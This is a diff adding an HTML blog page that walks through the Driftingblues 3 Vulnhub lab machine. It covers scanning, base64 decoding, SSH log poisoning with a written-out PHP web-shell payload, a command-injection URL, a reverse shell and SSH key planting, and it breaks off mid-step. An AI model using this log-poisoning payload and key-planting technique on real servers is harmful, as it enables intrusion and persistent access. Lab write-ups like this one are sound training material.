@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Nikit Writeups</title>
+        <!-- Favicon-->
+        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
+            <div class="container">
+                <a class="navbar-brand js-scroll-trigger" href="#page-top">Nikit Penkar</a>
+                <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#solution">Solution</a></li>
+                        <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/myblog/index.html">Back To Home</a></li>
+                        
+
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="bg-gradient-main">
+            <!-- Masthead-->
+            <header class="masthead text-white text-center">
+                <div class="container d-flex align-items-center flex-column">
+                    <!-- Masthead Avatar Image-->
+                    <img class="masthead-avatar mb-5" src="assets/img/avataaars.svg" alt="" />
+                    <!-- Masthead Heading-->
+                    <h1 class="masthead-heading text-uppercase mb-0">Driftingblues 3 Vulnhub Walkthrough</h1>
+                    <!-- Icon Divider-->
+                    <div class="divider-custom divider-light">
+                        <div class="divider-custom-line"></div>
+                        <div class="divider-custom-icon"><i class="fas fa-star"></i></div>
+                        <div class="divider-custom-line"></div>
+                    </div>
+                    <!-- Masthead Subheading-->
+                    <p class="masthead-subheading font-weight-light mb-0">
+                        Level : Beginner / Intermediate
+                    </p>
+                    <p class="masthead-subheading font-weight-light mt-2">
+                        Goal: Find user flag and root flag
+                    </p>
+                </div>
+            </header>
+        </div> 
+        <section class="page-section bgbody text-white mb-0" id="solution">
+            <div class="container">
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark">Summary</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        This is a writeup for the Vulnhub Machine - Driftingblues:3 which was released by tasiyanci
+                    </div>
+                </div>
+                
+
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Machine Discovery</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        First we will use nmap -sn 192.168.1.0/24 to discover the machine in your network. (I have assigned an IP of 192.168.1.0/24 range to my machine)
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                    <!-- Portfolio Item 1-->
+                        <div class="col-md-6 col-lg-4">
+                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal1">
+     
+                                
+                                <img class="img-fluid" src="assets/img/driftingblues/nmap.png" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                    <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-labelledby="portfolioModal1Label" aria-hidden="true">
+                        <div class="modal-dialog modal-xl" role="document">
+                            <div class="modal-content">
+                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                </button>
+                                <div class="modal-body text-center">
+                                    <div class="container">
+                                        <div class="row justify-content-center">
+                                            <div class="col-lg-8">
+                                                
+                                                <!-- Portfolio Modal - Image-->
+                                                <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/nmap.png" alt="" />
+                                                
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Port Scanning</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        Once the machine is discovered, we will do a port scan using nmap
+                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                            nmap -A -T4 -p- 192.168.1.5    
+                        </p>                      
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                <!-- Portfolio Item 1-->
+                    <div class="col-md-6 col-lg-4">
+                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal1">
+                            
+                                
+                          
+                            <img class="img-fluid" src="assets/img/driftingblues/nmapport.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-labelledby="portfolioModal1Label" aria-hidden="true">
+                    <div class="modal-dialog modal-xl" role="document">
+                        <div class="modal-content">
+                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                            </button>
+                            <div class="modal-body text-center">
+                                <div class="container">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8">
+                                            
+                                            <!-- Portfolio Modal - Image-->
+                                            <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/nmapport.png" alt="" />
+                                            
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                    
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Exploiting User Flag</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        We can see that SSH(Port 20) and HTTP(Port 80) are open. We can see that there is a disallowed entry in robots.txt of /eventadmins<br>
+                        We will start by first checking the website                    
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                <!-- Portfolio Item 1-->
+                    <div class="col-md-6 col-lg-4">
+                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal2">
+                            
+                                
+                        
+                            <img class="img-fluid" src="assets/img/driftingblues/webpage.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="portfolio-modal modal fade" id="portfolioModal2" tabindex="-1" role="dialog" aria-labelledby="portfolioModal2Label" aria-hidden="true">
+                    <div class="modal-dialog modal-xl" role="document">
+                        <div class="modal-content">
+                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                            </button>
+                            <div class="modal-body text-center">
+                                <div class="container">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8">
+                                            
+                                            <!-- Portfolio Modal - Image-->
+                                            <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/webpage.png" alt="" />
+                                            
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                        No clue here. We will check the /eventadmins page which was disallowed.
+                        </p>                      
+                    </div>
+                </div>
+
+                <div class="row justify-content-center">
+                    <!-- Portfolio Item 1-->
+                        <div class="col-md-6 col-lg-4">
+                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal3">
+                                
+                                    
+                              
+                                <img class="img-fluid" src="assets/img/driftingblues/eventadmins.png" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                    <div class="portfolio-modal modal fade" id="portfolioModal3" tabindex="-1" role="dialog" aria-labelledby="portfolioModal3Label" aria-hidden="true">
+                        <div class="modal-dialog modal-xl" role="document">
+                            <div class="modal-content">
+                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                </button>
+                                <div class="modal-body text-center">
+                                    <div class="container">
+                                        <div class="row justify-content-center">
+                                            <div class="col-lg-8">
+                                                
+                                                <!-- Portfolio Modal - Image-->
+                                                <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/eventadmins.png" alt="" />
+                                                
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                            We can see /littlequeenofspades.html page, so lets check it out.<br>
+                            After opening the page, you will see a poem. Then View Source code (CTRL+u) of the page
+                            </p>                      
+                        </div>
+                    </div>
+                    
+                    <div class="row justify-content-center">
+                        <!-- Portfolio Item 1-->
+                            <div class="col-md-6 col-lg-4">
+                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal4">
+                                    
+                                        
+                               
+                                    <img class="img-fluid" src="assets/img/driftingblues/sourcequeenofspades.png" alt="" />
+                                </div>
+                            </div>
+                        </div>
+                        <div class="portfolio-modal modal fade" id="portfolioModal4" tabindex="-1" role="dialog" aria-labelledby="portfolioModal4Label" aria-hidden="true">
+                            <div class="modal-dialog modal-xl" role="document">
+                                <div class="modal-content">
+                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                    </button>
+                                    <div class="modal-body text-center">
+                                        <div class="container">
+                                            <div class="row justify-content-center">
+                                                <div class="col-lg-8">
+                                                    
+                                                    <!-- Portfolio Modal - Image-->
+                                                    <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/sourcequeenofspades.png" alt="" />
+                                                    
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="row">
+                            <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                In the last line, you will see an encoded string. This is a double base64 encoded string so we will decode it.<br>
+                                Use echo ‘string’ | base64 -d  
+                                </p>                      
+                            </div>
+                        </div>
+                        
+                        <div class="row justify-content-center">
+                            <!-- Portfolio Item 1-->
+                                <div class="col-md-6 col-lg-4">
+                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal5">
+                                        
+                                  
+                                        <img class="img-fluid" src="assets/img/driftingblues/base64decode1.png" alt="" />
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="portfolio-modal modal fade" id="portfolioModal5" tabindex="-1" role="dialog" aria-labelledby="portfolioModal5Label" aria-hidden="true">
+                                <div class="modal-dialog modal-xl" role="document">
+                                    <div class="modal-content">
+                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                        </button>
+                                        <div class="modal-body text-center">
+                                            <div class="container">
+                                                <div class="row justify-content-center">
+                                                    <div class="col-lg-8">
+                                                        
+                                                        <!-- Portfolio Modal - Image-->
+                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/base64decode1.png" alt="" />
+                                                        
+                                                        
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                    Decode the encoded part again
+                                    </p>                      
+                                </div>
+                            </div>
+                            
+                            <div class="row justify-content-center">
+                                <!-- Portfolio Item 1-->
+                                    <div class="col-md-6 col-lg-4">
+                                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal6">
+                                            
+                                                
+                                        
+                                            <img class="img-fluid" src="assets/img/driftingblues/base64decode2.png" alt="" />
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="portfolio-modal modal fade" id="portfolioModal6" tabindex="-1" role="dialog" aria-labelledby="portfolioModal6Label" aria-hidden="true">
+                                    <div class="modal-dialog modal-xl" role="document">
+                                        <div class="modal-content">
+                                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                            </button>
+                                            <div class="modal-body text-center">
+                                                <div class="container">
+                                                    <div class="row justify-content-center">
+                                                        <div class="col-lg-8">
+                                                            
+                                                            <!-- Portfolio Modal - Image-->
+                                                            <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/base64decode2.png" alt="" />
+                                                            
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="row">
+                                    <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                        We got a /adminsfixit.php page. Lets check it out<br>
+                                        You will see a SSH log page. Go to View Source Code and you will see all the logs generated on the SSH
+                                        </p>                      
+                                    </div>
+                                </div>
+                                
+                                <div class="row justify-content-center">
+                                    <!-- Portfolio Item 1-->
+                                        <div class="col-md-6 col-lg-4">
+                                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal7">
+                                                
+                                                    
+                                      
+                                                <img class="img-fluid" src="assets/img/driftingblues/adminfixit.png" alt="" />
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="portfolio-modal modal fade" id="portfolioModal7" tabindex="-1" role="dialog" aria-labelledby="portfolioModal7Label" aria-hidden="true">
+                                        <div class="modal-dialog modal-xl" role="document">
+                                            <div class="modal-content">
+                                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                </button>
+                                                <div class="modal-body text-center">
+                                                    <div class="container">
+                                                        <div class="row justify-content-center">
+                                                            <div class="col-lg-8">
+                                                                
+                                                                <!-- Portfolio Modal - Image-->
+                                                                <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/adminfixit.png" alt="" />
+                                                                
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <div class="row">
+                                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                            If you login on SSH, you will see that the log gets generated here. For instance we will try ssh john@192.168.1.5
+                                            </p>                      
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="row justify-content-center">
+                                        <!-- Portfolio Item 1-->
+                                            <div class="col-md-6 col-lg-4">
+                                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal8">
+                                                    
+                                                        
+                                    
+                                                    <img class="img-fluid" src="assets/img/driftingblues/failssh.png" alt="" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="portfolio-modal modal fade" id="portfolioModal8" tabindex="-1" role="dialog" aria-labelledby="portfolioModal8Label" aria-hidden="true">
+                                            <div class="modal-dialog modal-xl" role="document">
+                                                <div class="modal-content">
+                                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                    </button>
+                                                    <div class="modal-body text-center">
+                                                        <div class="container">
+                                                            <div class="row justify-content-center">
+                                                                <div class="col-lg-8">
+                                                                    
+                                                                    <!-- Portfolio Modal - Image-->
+                                                                    <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/failssh.png" alt="" />
+                                                                    
+                                                                    
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModa51">
+                                                        
+                                                            
+                                               
+                                                        <img class="img-fluid" src="assets/img/driftingblues/sshlog.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModa51" tabindex="-1" role="dialog" aria-labelledby="portfolioModa51Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/sshlog.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+
+                                        
+                                    <div class="row">
+                                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                            As you can see, there is an entry for John in the ssh log. We do not need actual credentials, we just need to check if we can execute commands on the server<br>
+                                            Now since logs are generating, we can get a reverse shell. But for that we need to start cmd webshell on the target<br>
+                                            We will use PHP command to get a webshell
+                                            </p>
+                                            <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                            ssh '&lt?php system($_GET[“CMD”]); ?&gt’@192.168.1.5
+                                            </p>                      
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="row justify-content-center">
+                                        <!-- Portfolio Item 1-->
+                                            <div class="col-md-6 col-lg-4">
+                                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal9">
+                                                       
+                                             
+                                                    <img class="img-fluid" src="assets/img/driftingblues/phpshell.png" alt="" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="portfolio-modal modal fade" id="portfolioModal9" tabindex="-1" role="dialog" aria-labelledby="portfolioModal9Label" aria-hidden="true">
+                                            <div class="modal-dialog modal-xl" role="document">
+                                                <div class="modal-content">
+                                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                    </button>
+                                                    <div class="modal-body text-center">
+                                                        <div class="container">
+                                                            <div class="row justify-content-center">
+                                                                <div class="col-lg-8">
+                                                                    
+                                                                    <!-- Portfolio Modal - Image-->
+                                                                    <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/phpshell.png" alt="" />
+                                                                    
+                                                                    
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="row">
+                                            <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                Now we can use cmd in the URL for code injection. We can start by checking the id
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                http:192.168.1.5/adminsfixit.php?cmd=id
+                                                </p>                      
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal10">
+                                                        
+                                                            
+                                                       
+                                                        <img class="img-fluid" src="assets/img/driftingblues/sshlog2.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal10" tabindex="-1" role="dialog" aria-labelledby="portfolioModal10Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/sshlog2.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+    
+
+                                            
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                                                    As you can see, we are able to see the id command executed.<br>
+                                                    Now can go for a netcat reverse shell.<br>
+                                                    On terminal we will start the listener and on Browser, we will execute the reverse shell 
+                                                    </p>                      
+                                                </div>
+                                            </div>
+
+                                            <div class="row justify-content-center">
+                                                <!-- Portfolio Item 1-->
+                                                    <div class="col-md-6 col-lg-4">
+                                                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal11">
+                                                            
+                                                                
+                                              
+                                                            <img class="img-fluid" src="assets/img/driftingblues/ncshell.png" alt="" />
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="portfolio-modal modal fade" id="portfolioModal11" tabindex="-1" role="dialog" aria-labelledby="portfolioModal11Label" aria-hidden="true">
+                                                    <div class="modal-dialog modal-xl" role="document">
+                                                        <div class="modal-content">
+                                                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                            </button>
+                                                            <div class="modal-body text-center">
+                                                                <div class="container">
+                                                                    <div class="row justify-content-center">
+                                                                        <div class="col-lg-8">
+                                                                            
+                                                                            <!-- Portfolio Modal - Image-->
+                                                                            <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/ncshell.png" alt="" />
+                                                                            
+                                                                           
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div> 
+
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal11">
+                                                        
+                                                            
+                                         
+                                                        <img class="img-fluid" src="assets/img/driftingblues/revshell.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal11" tabindex="-1" role="dialog" aria-labelledby="portfolioModal11Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/revshell.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>                        
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    And we got our shell<br>
+                                                    We will use python command to get a bash shell  
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal12">
+                                                        
+                                                            
+                                           
+                                                        <img class="img-fluid" src="assets/img/driftingblues/pythonterm.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal12" tabindex="-1" role="dialog" aria-labelledby="portfolioModal12Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/pythonterm.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Now we will go to /home directory and we can see that there is a user called robertj. Now cd into robertj<br>
+                                                    We can see user flag user.txt but we do not have permission to access it.  
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal13">
+                                                        
+                                                            
+                                       
+                                                        <img class="img-fluid" src="assets/img/driftingblues/permdenied.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal13" tabindex="-1" role="dialog" aria-labelledby="portfolioModal13Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/permdenied.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We need to login as robertj to access the flag<br>
+                                                    If you have observed, we do not need password for SSH login. We need to login with the key<br>
+                                                    We can create our own Public and Private key which will be stored in the /.ssh directory in robertj<br>
+                                                    We will use ssh-keygen -t rsa command for this.<br>
+                                                    We will enter the path to save the key as /home/robertj/.ssh/rsa_key   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal14">
+                                                        
+                                                            
+                                     
+                                                        <img class="img-fluid" src="assets/img/driftingblues/sshkeygen.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal14" tabindex="-1" role="dialog" aria-labelledby="portfolioModal14Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/sshkeygen.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We need to save the public key (rsa_key.pub) to authorized_keys file which is used by SSH to verify login.<br>   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal15">
+                                                        
+                                  
+                                                        <img class="img-fluid" src="assets/img/driftingblues/authkeys.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal15" tabindex="-1" role="dialog" aria-labelledby="portfolioModal15Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/authkeys.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Use cat to check the public key (rsa_key.pub) and private key (rsa_key) and then copy the private key to your attack machine and save it into a text file.                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal16">
+                                                        
+                                                            
+                                       
